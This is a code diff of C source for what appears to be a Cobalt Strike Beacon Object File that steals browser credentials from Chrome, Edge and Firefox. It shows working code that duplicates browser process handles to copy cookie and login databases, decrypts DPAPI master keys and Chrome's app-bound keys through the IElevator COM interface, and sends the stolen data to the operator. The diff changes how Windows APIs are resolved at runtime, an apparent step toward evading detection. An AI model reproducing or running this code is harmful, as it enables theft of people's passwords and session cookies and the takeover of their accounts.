@@ -24,68 +24,67 @@ WINBASEAPI char* __cdecl  MSVCRT$strstr (char* _String, const char* _SubString);
 WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *s);
 DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strchr(const char *haystack, int needle);
 WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
-WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ _Dest,size_t _Count,const char * __restrict__ _Format,...);
+//WINBASEAPI int __cdecl _snprintf(char * __restrict__ _Dest,size_t _Count,const char * __restrict__ _Format,...);
 WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
 
-WINADVAPI WINBOOL WINAPI ADVAPI32$RevertToSelf();
+//WINADVAPI WINBOOL WINAPI RevertToSelf();
 WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
-WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
-WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
-WINADVAPI WINBOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
-WINBASEAPI LPSTR WINAPI SHLWAPI$StrStrIA(LPCSTR lpFirst,LPCSTR lpSrch);
+//WINADVAPI WINBOOL WINAPI OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
+//WINADVAPI WINBOOL WINAPI DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
+//WINADVAPI WINBOOL WINAPI ImpersonateLoggedOnUser(HANDLE);
 
 WINBASEAPI int __cdecl MSVCRT$memcmp(const void *_Buf1,const void *_Buf2,size_t _Size);
 WINBASEAPI char* __cdecl  MSVCRT$strncpy (char * __dst, const char * __src, size_t __n);
 WINBASEAPI char* __cdecl  MSVCRT$strncat (char * _Dest,const char * _Source, size_t __n);
 DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
-WINBASEAPI wchar_t *__cdecl MSVCRT$wcsncpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source, size_t _Count);
+//WINBASEAPI wchar_t *__cdecl wcsncpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source, size_t _Count);
 WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1, const wchar_t *_Str2);
 WINBASEAPI BOOL  WINAPI   CRYPT32$CryptUnprotectData (DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);
 WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
 WINBASEAPI HANDLE WINAPI  KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
-WINBASEAPI BOOL WINAPI    KERNEL32$Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
-WINBASEAPI BOOL WINAPI    KERNEL32$Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
+//WINBASEAPI BOOL WINAPI    Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
+//WINBASEAPI BOOL WINAPI    Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
 // WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess (VOID);
-WINBASEAPI DWORD WINAPI KERNEL32$GetFileType(HANDLE hFile);
-WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
+// WINBASEAPI DWORD WINAPI GetFileType(HANDLE hFile);
+//WINBASEAPI BOOL WINAPI    DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
 WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
-WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
-//WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
-//WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
-WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
+//WINBASEAPI BOOL WINAPI    CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
+WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
+WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
+WINBASEAPI DWORD WINAPI   SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
 //WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
-DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
+//DECLSPEC_IMPORT NTSTATUS WINAPI NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
 WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
 WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
 WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
 WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
-DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+//DECLSPEC_IMPORT NTSTATUS NTAPI NtQueryObject(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
-WINBASEAPI BSTR WINAPI OLEAUT32$SysAllocStringByteLen(LPCSTR psz,UINT len);
-WINBASEAPI void WINAPI OLEAUT32$SysFreeString(BSTR);
-WINBASEAPI UINT WINAPI OLEAUT32$SysStringByteLen(BSTR bstr);
+//WINBASEAPI BSTR WINAPI SysAllocStringByteLen(LPCSTR psz,UINT len);
+//WINBASEAPI void WINAPI SysFreeString(BSTR);
+//WINBASEAPI UINT WINAPI SysStringByteLen(BSTR bstr);
 
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx (LPVOID pvReserved, DWORD dwCoInit);
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoUninitialize (void);
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
-DECLSPEC_IMPORT	HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
+//DECLSPEC_IMPORT HRESULT WINAPI CoInitializeEx (LPVOID pvReserved, DWORD dwCoInit);
+//DECLSPEC_IMPORT HRESULT WINAPI CoUninitialize (void);
+//DECLSPEC_IMPORT HRESULT WINAPI CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
+DECLSPEC_IMPORT	HRESULT WINAPI CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
 WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
 WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
-DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptFreeObject (NCRYPT_HANDLE hObject);
-DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags);
-DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
-DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
+//DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCryptFreeObject (NCRYPT_HANDLE hObject);
+//DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCryptDecrypt (NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags);
+//DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
+//DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
 
-DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
+//DECLSPEC_IMPORT HRESULT WINAPI SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath);
 WINBASEAPI BOOL WINAPI SHLWAPI$PathAppendA(LPCSTR pszPath, LPCSTR pszMore);
-WINBASEAPI int __cdecl MSVCRT$rand();
-WINBASEAPI void __cdecl MSVCRT$srand(int initial);
-WINBASEAPI time_t __cdecl MSVCRT$time(time_t *time);
-WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str,size_t _MaxCount);
+//WINBASEAPI int __cdecl rand();
+//WINBASEAPI void __cdecl srand(int initial);
+//WINBASEAPI time_t __cdecl time(time_t *time);
+//WINBASEAPI size_t __cdecl strnlen(const char *_Str,size_t _MaxCount);
 //WINBASEAPI void *__cdecl MSVCRT$realloc(void *_Memory, size_t _NewSize);
 
 // #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
-//     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
+//     FARPROC PathAppend = Resolver("shlwapi", "SHLWAPI$PathAppendA"); \
 //     FARPROC srand = Resolver("msvcrt", "srand");\
 //     FARPROC time = Resolver("msvcrt", "time");\
 //     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
@@ -105,21 +104,23 @@ WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *_Str,size_t _MaxCount);
 static char* supported_browsers[] = {"chrome", "msedge", "firefox"};
 
 //workaround for no slot for function (reduce number of Win32 APIs called) 
-// FARPROC Resolver(CHAR *lib, CHAR *func) {
-//     FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
-//     return ptr;
-// }
+FARPROC Resolver(CHAR *lib, CHAR *func) {
+    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
+    return ptr;
+}
 
 CHAR *GetFileContent(CHAR *path) {
     CHAR fullPath[MAX_PATH];
     HANDLE hFile = NULL;
     //IMPORT_RESOLVE;
 
+    FARPROC SHGetFolderPathA = Resolver("SHELL32", "SHGetFolderPathA");
+
     //get appdata local path and append path 
     if (path[0] == '\\') {
         BeaconPrintf(CALLBACK_OUTPUT,"[+] Appending local app data path");
         CHAR appdata[MAX_PATH];
-        SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
+        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
         SHLWAPI$PathAppendA(appdata, path);
         MSVCRT$strncpy(fullPath, appdata, MAX_PATH);
     } else {
@@ -180,12 +181,14 @@ CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
 }
 
 VOID GetMasterKey(CHAR *key) {
+    FARPROC CryptStringToBinaryA = Resolver("CRYPT32", "CryptStringToBinaryA");
+
     Buffer result = {0};
     DWORD dwOut = 0;
     //IMPORT_RESOLVE;
 
     //calculate size of key
-    if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL)) {
+    if (!CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
         return;
     }
@@ -195,7 +198,7 @@ VOID GetMasterKey(CHAR *key) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to allocate memory for key\n");
         return;
     }
-    if (!CRYPT32$CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, result.data, &dwOut, NULL, NULL)) {
+    if (!CryptStringToBinaryA(key, 0, CRYPT_STRING_BASE64, result.data, &dwOut, NULL, NULL)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to decrypt base64 key\n");
         return;
     }
@@ -286,10 +289,19 @@ char* BytesToHexString(const BYTE *byteArray, size_t size) {
 }
 
 VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, const IID IID_IElevator) {
+
+    FARPROC SysStringByteLen = Resolver("OLEAUT32", "SysStringByteLen");
+    FARPROC SysFreeString = Resolver("OLEAUT32", "SysFreeString");
+    FARPROC SysAllocStringByteLen = Resolver("OLEAUT32", "SysAllocStringByteLen");
+    FARPROC CoUninitialize = Resolver("OLE32", "CoUninitialize");
+    FARPROC CoSetProxyBlanket = Resolver("OLE32", "CoSetProxyBlanket");
+    FARPROC CoInitializeEx = Resolver("OLE32", "CoInitializeEx");
+    FARPROC CoCreateInstance = Resolver("OLE32", "CoCreateInstance");
+
     // initialize COM
-    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (FAILED(hr)) {
-    	hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     	if (FAILED(hr)) {
 			BeaconPrintf(CALLBACK_ERROR,"[!] CoInitializeEx failed: 0x%x\n", hr);
         	return;
@@ -299,19 +311,19 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     IElevatorEdge* edgeElevator = NULL;
     // Create an instance of the IElevator COM object
     if (MSVCRT$strcmp(browser, "chrome") == 0){
-        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
+        hr = CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
     }
     if (MSVCRT$strcmp(browser, "msedge") == 0){
-        hr = OLE32$CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
+        hr = CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
     }
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to create IElevator instance.\n");
-        OLE32$CoUninitialize();
+        CoUninitialize();
         return;
     }
     // Set the security blanket on the proxy
     if (MSVCRT$strcmp(browser, "chrome") == 0) {
-        hr = OLE32$CoSetProxyBlanket(
+        hr = CoSetProxyBlanket(
             (IUnknown *) chromeElevator,
             RPC_C_AUTHN_DEFAULT,
             RPC_C_AUTHZ_DEFAULT,
@@ -323,7 +335,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         );
     }
     if (MSVCRT$strcmp(browser, "msedge") == 0) {
-        hr = OLE32$CoSetProxyBlanket(
+        hr = CoSetProxyBlanket(
             (IUnknown *) edgeElevator,
             RPC_C_AUTHN_DEFAULT,
             RPC_C_AUTHZ_DEFAULT,
@@ -337,7 +349,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
 
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR,"[!] Failed to set proxy blanket.\n");
-        OLE32$CoUninitialize();
+        CoUninitialize();
         return;
     }
     
@@ -347,7 +359,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     if (MSVCRT$memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Invalid key header.\n");
         MSVCRT$free(encrypted_key_with_header);
-        OLE32$CoUninitialize();
+        CoUninitialize();
         return;
     }
     
@@ -357,7 +369,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
     //BeaconPrintf(CALLBACK_OUTPUT, "encrypted key length %d\n", encrypted_key_len);
 
-    BSTR ciphertext_data = OLEAUT32$SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );
+    BSTR ciphertext_data = SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );
     
     //BeaconPrintf(CALLBACK_OUTPUT, "Base64 Decoded Encrypted Key: %s\n", BytesToHexString(ciphertext_data, encrypted_key_len));
     BSTR plaintext_data = NULL;
@@ -372,7 +384,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
     // return decrypted key
     if (SUCCEEDED(hr)) {
         //BeaconPrintf(CALLBACK_OUTPUT, "Decryption succeeded.\n");
-        DWORD decrypted_size = OLEAUT32$SysStringByteLen(plaintext_data);
+        DWORD decrypted_size = SysStringByteLen(plaintext_data);
         //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Data Size: %d\n", decrypted_size);
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
 
@@ -380,8 +392,8 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         BeaconPrintf(CALLBACK_ERROR, "[!] App Bound Key Decryption failed. Last error: %lu\n If error 203, beacon is most likely not operating out of correct file path \n", last_error);
     }
 
-    OLEAUT32$SysFreeString(plaintext_data);
-    OLEAUT32$SysFreeString(ciphertext_data);
+    SysFreeString(plaintext_data);
+    SysFreeString(ciphertext_data);
     
     MSVCRT$free(encrypted_key_with_header);
     MSVCRT$free(encrypted_key);
@@ -392,7 +404,7 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         hr = edgeElevator->lpVtbl->Release(edgeElevator);
     }
 
-    OLE32$CoUninitialize();
+    CoUninitialize();
 
     return;
 
@@ -451,6 +463,11 @@ VOID GetEncryptionKey(char * browser) {
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
     CHAR *appdata = NULL;
     CHAR *tempProfile = NULL;
+
+    FARPROC SHGetFolderPathA = Resolver("SHELL32", "SHGetFolderPathA");
+
+    FARPROC strncat = Resolver("MSVCRT", "strncat");
+
     //IMPORT_RESOLVE;
     // create temp var to hold profile
     tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MSVCRT$strlen(profile) + 1);
@@ -458,7 +475,7 @@ CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
     appdata = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MAX_PATH + 1);
 
     //get appdata local path and append path to file
-    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
     file = MSVCRT$strncat(tempProfile, file, MSVCRT$strlen(file)+1);
     SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\Profiles");
     SHLWAPI$PathAppendA(appdata, file);
@@ -472,9 +489,9 @@ VOID GetFirefoxInfo() {
     CHAR appdata[MAX_PATH];
     HANDLE hFile = NULL;
     //IMPORT_RESOLVE;
-
+    FARPROC SHGetFolderPathA = Resolver("SHELL32", "SHGetFolderPathA");
     //get appdata local path and append path 
-    SHELL32$SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
     SHLWAPI$PathAppendA(appdata, "\\Mozilla\\Firefox\\profiles.ini");
     //BeaconPrintf(CALLBACK_OUTPUT,"Firefox profile info be at: %s \n", appdata );
 
@@ -571,6 +588,10 @@ VOID GetFirefoxInfo() {
 }
 
 VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPath) {
+
+    FARPROC Process32First = Resolver("KERNEL32", "Process32First");
+    FARPROC Process32Next = Resolver("KERNEL32", "Process32Next");
+
     //get handle to all processes
     HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
@@ -609,7 +630,7 @@ VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPa
 
     //iterate through each handle to find browser process
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Looking for %s Data \n", browser);
-    if(KERNEL32$Process32First(hSnap, &pe32)) {
+    if(Process32First(hSnap, &pe32)) {
         do {
             //BeaconPrintf(CALLBACK_OUTPUT, "Process: %s\n", pe32.szExeFile);
             if(MSVCRT$strcmp(pe32.szExeFile, browserProcess) == 0)
@@ -633,7 +654,7 @@ VOID GetBrowserData(char * browser, BOOL cookie, BOOL loginData, char * folderPa
                     break;
                 }
             }
-        } while(KERNEL32$Process32Next(hSnap, &pe32));
+        } while(Process32Next(hSnap, &pe32));
         if (!databaseStatus && cookie) {
             BeaconPrintf(CALLBACK_ERROR, "[!] Failed to locate cookies database for %s", browser);
         }
@@ -703,6 +724,15 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     
     //BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
     //BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);
+
+    FARPROC NtQuerySystemInformation = Resolver("NTDLL", "NtQuerySystemInformation");
+    FARPROC NtQueryObject = Resolver("NTDLL", "NtQueryObject");
+
+    FARPROC wcsncpy = Resolver("MSVCRT", "wcsncpy");
+
+    FARPROC SetFilePointer = Resolver("KERNEL32", "SetFilePointer");
+    FARPROC DuplicateHandle = Resolver("KERNEL32", "DuplicateHandle");
+    FARPROC GetFileType = Resolver("KERNEL32", "GetFileType");
     
     SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
@@ -723,7 +753,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     }
 
     //utilize NtQueryStemInformation to list all handles on system
-    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
     if (status == STATUS_INFO_LENGTH_MISMATCH) {
         dwSize = dwNeeded;
         // Only Assign on success
@@ -733,7 +763,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
             return FALSE;
         }
     }
-    status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
     if (status != 0) {
         BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation failed with status 0x%x.\n", status);
         KERNEL32$GlobalFree(shi);
@@ -770,20 +800,20 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
             continue;
         }
 
-        if (!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE)-1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+        if (!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE)-1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
             //BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
             continue;
         }
 
         //Check if the handle exists on disk, otherwise the program will hang
-        if (KERNEL32$GetFileType(hDuplicate) != FILE_TYPE_DISK) {
+        if (GetFileType(hDuplicate) != FILE_TYPE_DISK) {
             //BeaconPrintf(CALLBACK_ERROR, "NOT A FILE");
             continue;
         }
 
         ULONG returnLength = 0;
         //BeaconPrintf(CALLBACK_OUTPUT,"Duplicated Handle, confirmed file on disk");
-        status = NTDLL$NtQueryObject(hDuplicate, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+        status = NtQueryObject(hDuplicate, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
         if (status != 0) {
             BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
             continue;
@@ -796,7 +826,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
         char handleName[1024];
         MSVCRT$sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-        status = NTDLL$NtQueryObject(hDuplicate, ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+        status = NtQueryObject(hDuplicate, ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
         if (status != 0) {
 
             BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
@@ -807,7 +837,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
         UNICODE_STRING *typeStr = &objectTypeInfo->TypeName;
         WCHAR typeName[256] = {0};
         int len = min(typeStr->Length / sizeof(WCHAR), 255);
-        MSVCRT$wcsncpy(typeName, typeStr->Buffer, len);
+        wcsncpy(typeName, typeStr->Buffer, len);
         typeName[len] = L'\0'; // null terminated
 
         if (MSVCRT$_wcsicmp(typeName, L"File") != 0) {
@@ -826,7 +856,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
                 //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
+                SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                 DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
                 BeaconPrintf(CALLBACK_OUTPUT, "[+] file size is %d\n", dwFileSize);
 
@@ -885,17 +915,23 @@ cleanup_and_exit:
 BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength)
 {
     //IMPORT_RESOLVE;
-    int fileNameLength = MSVCRT$strnlen(fileName, 256);
+
+    FARPROC time = Resolver("MSVCRT", "time");
+    FARPROC strnlen = Resolver("MSVCRT", "strnlen");
+    FARPROC srand = Resolver("MSVCRT", "srand");
+    FARPROC rand = Resolver("MSVCRT", "rand");
+
+    int fileNameLength = strnlen(fileName, 256);
 
     // intializes the random number generator
     time_t t;
-    MSVCRT$srand((unsigned) MSVCRT$time(&t));
+    srand((unsigned) time(&t));
 
     // generate a 4 byte random id, rand max value is 0x7fff
     ULONG32 fileId = 0;
-    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
-    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
-    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;
+    fileId |= (rand() & 0x7FFF) << 0x11;
+    fileId |= (rand() & 0x7FFF) << 0x02;
+    fileId |= (rand() & 0x0003) << 0x00;
 
     // 8 bytes for fileId and fileLength
     int messageLength = 8 + fileNameLength;
